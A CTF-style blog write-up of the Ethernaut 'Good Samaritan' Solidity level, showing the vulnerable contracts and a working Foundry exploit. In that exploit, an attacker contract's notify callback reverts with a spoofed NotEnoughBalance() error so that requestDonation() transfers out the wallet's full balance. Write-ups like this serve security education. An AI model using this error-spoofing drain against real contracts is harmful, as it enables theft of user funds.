---
layout: post
title: "[Ethernaut] 27.Good Samaritan"
tags: blockchain ethernaut foundry selector
---

# Analysis

---

The goal is “drain all the balance from Good Samaritan’s ****Wallet”.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns (bool enoughBalance) {
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10 ** 6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if (amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if (dest_.isContract()) {
                // notify contract
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

**GoodSamaritan Contract:** Enables users to request a donation of 10 tokens via the `requestDonation()` function.

**Coin Contract:** Mints an initial supply of `10 ** 6` tokens and manages token transfer functionality.

Wallet Contract: Handles the execution of the 10 token donation and supports transferring the entire remaining token balance.

# Exploit

---

Invoking `requestDonation()` initiates the following call chain: `wallet.donate10()`-> `coin.transfer()`.

Within `coin.transfer()`, if the destination address (`dest_`) is a contract, it invokes `INotifyable(dest_).notify()`. 

Since this is defined as an interface, the destination contract can implement arbitrary logic within this callback.

If a `NotEnoughBalance()` error occurs during `requestDonation()`, the error handling logic triggers `wallet.transferRemainder()`, which transfers the entire remaining token balance.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GoodSamaritan.sol";
import "forge-std/Script.sol";

contract Ex {
    GoodSamaritan public gs_ = GoodSamaritan(0xEa1710DCb7287aFA9a0Cb07e5ADEf8c592F586f0);
    error NotEnoughBalance();

    function notify(uint256 amount) external {
        if(amount == 10) revert NotEnoughBalance();
    }

    function ex() public {
        gs_.requestDonation();
    }
}

contract GoodSamaritanSol is Script {
    GoodSamaritan public gs_ = GoodSamaritan(0xEa1710DCb7287aFA9a0Cb07e5ADEf8c592F586f0);

    function run() external {
        vm.startBroadcast();
    
        Ex ex_ = new Ex();
        ex_.ex();
        console.log(gs_.coin().balances(address(gs_.wallet())));

        vm.stopBroadcast();
    }
}
```